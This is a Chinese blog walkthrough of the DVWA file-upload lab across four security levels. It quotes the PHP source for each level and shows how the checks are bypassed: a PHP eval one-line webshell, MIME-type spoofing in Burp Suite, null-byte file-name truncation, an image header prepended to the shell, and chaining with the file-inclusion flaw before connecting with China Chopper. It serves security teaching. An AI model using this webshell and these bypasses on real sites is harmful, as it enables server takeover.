**目录**

[Low：](#t0)

[Medium:](#t1)

[方法一：抓包修改文件的type](#t2)

[方法二：00截断](#t3)

[High：](#t4)

[Impossible ：](#t5)

* * *

Low：
----

源代码：

```
<?php      
if( isset( $_POST[ 'Upload' ] ) ) {      
    // Where are we going to be writing to?      
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";   //上传文件的路径      
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );   //文件路径=上文文件的路径+文件名      
    // Can we move the file to the upload folder?      
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {      
        // No      
        echo '<pre>Your image was not uploaded.</pre>';      1
    }      1
    else {      1
        // Yes!      1
        echo "<pre>{$target_path} succesfully uploaded!</pre>";      1
    }      1
}      1
?>
```


basename(path,suffix)  
函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。  
可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。  
如果上传成功，则会提示  路径+succesfully uploaded! 如果上传失败，则会提示 Your image was not uploaded。  
我们可以写一句话木马 1.php ，上传

```
<?php   @eval($_POST['xie']);  ?>
```


![](https://img-blog.csdn.net/20180930083241185?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

 可以看到，我们的一句话木马已经成功上传了，接下来我们就可以用菜刀连接了。 连接的url是

[http://127.0.0.1/hackable/uploads/1.php](http://127.0.0.1/hackable/uploads/1.php)

![](https://img-blog.csdn.net/2018093008360325?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

Medium:
-------

源代码：

```
<?php      
if( isset( $_POST[ 'Upload' ] ) ) {      
    // Where are we going to be writing to?      
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";      
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );      
    // File information      
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];      
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];      
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];      1
    // Is it an image?      1
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&      1
        ( $uploaded_size < 100000 ) ) {      1
        // Can we move the file to the upload folder?      1
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {      1
            // No      1
            echo '<pre>Your image was not uploaded.</pre>';      1
        }      1
        else {      1
            // Yes!      2
            echo "<pre>{$target_path} succesfully uploaded!</pre>";      2
        }      2
    }      2
    else {      2
        // Invalid file      2
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';      2
    }      2
}      2
?>
```


可以看到，服务器对上传文件的大小和类型做了限制。只允许上传小于 100000 字节并且文件type类型是image/jpeg或 image/png 的。

### **方法一：抓包修改文件的type**

因为这里过滤的是文件的上传类型，而不是文件的后缀名

所以我们直接上传 1.php 的一句话木马

```
<?php   @eval($_POST['xie']);  ?>
```


通过burpsuite[抓包](https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020)，默认type类型是application/octer-stream 

![](https://img-blog.csdn.net/20180930194739305?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

我们将其类型改为 image/jpeg ，然后go上传，可以看到，已经上传成功！

![](https://img-blog.csdn.net/20180930194855635?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

然后直接通过中国菜刀连接url： [http://127.0.0.1/hackable/uploads/1.php](http://127.0.0.1/hackable/uploads/1.php)  即可拿下网站Webshell 

### 方法二：00截断

在php<5.3.4中，处理字符串的函数认为0x00是终止符。那么我们可以利用 00截断 漏洞来上传我们的一句话木马。网站上传函数处理1.php%00.jpg时，首先后缀名是合法的jpg格式，可以上传，在保存文件时，使用burpsuite进行包拦截，找到上传的路径，把文件名改为 1.php\[空格\].jpg ，十六进制查看，空格的十六进制代码为20,将其修改为 00。后端在判断文件后缀名的时候遇到%00字符丢弃后面的jpg，文件后缀最终保存的后缀 名为 1.php。然后我们就可以用我们的菜刀连接了。

我们写一句话木马，并将其命名为 1.php.jpg  ，上传

```
<?php   @eval($_POST['xie']);  ?>
```


然后用 burpsuite 进行包拦截，转发到 repeater 模块

![](https://img-blog.csdn.net/20180930084857327?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

**\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*** 

**00截断一：** 

我们将文件名改成 1.php .jpg 然后16进制查看 

![](https://img-blog.csdn.net/2018093008494872?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

空格的16进制代码是 20 

![](https://img-blog.csdn.net/20180930085125774?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

我们将其改为 00 

![](https://img-blog.csdn.net/20180930085222186?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

然后再查看，我们可以看到文件名已经变了

![](https://img-blog.csdn.net/20180930085249782?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

**00截断二：**

我们将文件名改为 1.php%00.jpg

![](https://img-blog.csdn.net/2018093009052354?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

然后我们选中 %00 ，然后进行URL-decode

![](https://img-blog.csdn.net/20180930090739566?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

可以看到，文件名已经变了

![](https://img-blog.csdn.net/20180930091016215?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

我们点击 go ，可以看到已经上传成功了

![](https://img-blog.csdn.net/20180930085426290?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

接下来我们就可以用菜刀连接了。 连接的url是

[http://127.0.0.1/hackable/uploads/1.php](http://127.0.0.1/hackable/uploads/1.php)

![](https://img-blog.csdn.net/20180930085538215?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

High：
-----

源代码：

```
<?php      
if( isset( $_POST[ 'Upload' ] ) ) {      
    // Where are we going to be writing to?      
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";      
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );      
    // File information      
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];    //文件在上传者机器上的文件名      
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); //上传文件的后缀名      
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];   //上传文件的大小      1
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; //上传文件保存在服务器临时文件夹的文件名      1
    // Is it an image?      1
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext )=="jpeg" || strtolower( $uploaded_ext ) == "png" ) &&( $uploaded_size < 100000 ) &&      1
        getimagesize( $uploaded_tmp ) ) {      1
        // Can we move the file to the upload folder?      1
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {      1
            // No      1
            echo '<pre>Your image was not uploaded.</pre>';      1
        }      1
        else {      2
            // Yes!      2
            echo "<pre>{$target_path} succesfully uploaded!</pre>";      2
        }      2
    }      2
    else {      2
        // Invalid file      2
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';      2
    }      2
}      2
?>
```


 strrpos(string , find ,start)  查找find字符在string字符中的最后一次出现的位置，start参数可选，表示指定从哪里开始

 substr(string,start,length) 返回string字符中从start开始的字符串，length参数可选，表示返回字符的长度

 strtolower(string) 返回给定字符串的小写

 getimagesize(string) ：函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 `IMG` 标记中的 height/width 文本字符串。如果不能访问 `filename` 指定的图像或者其不是有效的图像，**getimagesize()** 将返回 **`FALSE`** 并产生一条 E\_WARNING级的错误。所以 getimagesize函数的作用是判断上传的文件是不是有效的图片

move\_uploaded\_file（file,newlocal） 函数表示把给定的文件移动到新的位置

 所以  $uploaded\_ext  表示的是上传文件的后缀名 ，这里限制上传的文件的后缀名必须以 jpg 、jpeg　或　png　结尾，同时大小<100000，同时上传的文件必须是有效的图片格式（不只是以图片的格式结尾，而且文件内容是图片格式的）。

我们直接上传一句话木马，然后把文件名改为 1.jpg

```
<?php   @eval($_POST['xie']);  ?>
```


发现上传不了，因为仅仅后缀是图片格式的还不行，文件内容必须还得是图片格式的。 

![](https://img-blog.csdn.net/20180930192159394?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

所以我们在文件头部加上了jpg格式的 GIF89 

```
GIF89      
<?php @eval($_POST['xie'])?>
```


或者我们可以在cmd命令行下： copy  /b  1.jpg+1.php  1.jpg    把一句话木马写入到图片的最末端也可以。 

在文件头部加了jpg格式的 GIF89 标识后成功上传！ 

![](https://img-blog.csdn.net/20180930192324903?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

虽然我们的一句话木马上传成功了，但是他是以jpg为后缀的，菜刀不能直接连接，必须让他作为php解析。

中国菜刀的原理是向上传文件发送包含参数的post请求，通过控制参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。

![](https://img-blog.csdn.net/20180930193003489?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

那么，怎么才能让我们的图片以 php 格式运行呢？ 文件包含！我们可以利用DVWA的文件包含漏洞，让我们的图片格式的一句话木马以php格式运行。

我们访问该URL：

[http://127.0.0.1/vulnerabilities/fi/?page=file:///D:/PhpStudy/PHPTutorial/WWW/DVWA/hackable/uploads/1.jpg](http://127.0.0.1/vulnerabilities/fi/?page=file:///D:/PhpStudy/PHPTutorial/WWW/DVWA/hackable/uploads/1.jpg)  

![](https://img-blog.csdn.net/20181001161541556?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

可以看到，成功包含了我们上传的一句话木马图片，把该图片当成php文件执行了。

然后我们就可以用中国菜刀进行连接了

因为这个网站是要登录的，所以我们在菜刀中右键，然后浏览网站，然后登录就可以在菜刀中保持我们的session。然后就可以获取Webshell了。

![](https://img-blog.csdn.net/20180930203033712?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

Impossible ：
------------

源代码

```
<?php       
if( isset( $_POST[ 'Upload' ] ) ) {      
    // Check Anti-CSRF token      
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );       
    // File information      
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];    //文件在上传者机器上的文件名      1
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); //上传文件的后缀名      1
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];  //上传文件的大小      1
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];  //上文文件的类型      1
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];  //文件上传到服务器临时文件夹后的文件名       1
    // Where are we going to be writing to?      1
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';      1
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';      1
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;      1
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );      2
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;       2
    // Is it an image?      2
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&      2
        ( $uploaded_size < 100000 ) &&      2
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&      2
        getimagesize( $uploaded_tmp ) ) {       2
        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)      2
        if( $uploaded_type == 'image/jpeg' ) {      3
            $img = imagecreatefromjpeg( $uploaded_tmp );      3
            imagejpeg( $img, $temp_file, 100);      3
        }      3
        else {      3
            $img = imagecreatefrompng( $uploaded_tmp );      3
            imagepng( $img, $temp_file, 9);      3
        }      3
        imagedestroy( $img );       3
        // Can we move the file to the web root from the temp folder?      4
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {      4
            // Yes!      4
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>";      4
        }      4
        else {      4
            // No      4
            echo '<pre>Your image was not uploaded.</pre>';      4
        }       4
        // Delete any temp files      5
        if( file_exists( $temp_file ) )      5
            unlink( $temp_file );      5
    }      5
    else {      5
        // Invalid file      5
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';      5
    }      5
}       5
// Generate Anti-CSRF token      6
generateSessionToken();       6
?>
```


imagecreatefromjpeg(filename)：从给定的文件或url中创建一个新的图片

imagejpeg(image,filename,quality)：从image图像中以 filename 文件名创建一个jpeg的图片，参数quality可选，0-100 (质量从小到大)

imagedestroy(image) ： 销毁图像

可以看到，Impossible级别对上传的文件进行了重命名（为md5值，导致00截断无法绕过过滤规则），并且加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。

### 相关文章：[文件上传漏洞和解析漏洞](https://blog.csdn.net/qq_36119192/article/details/82848056)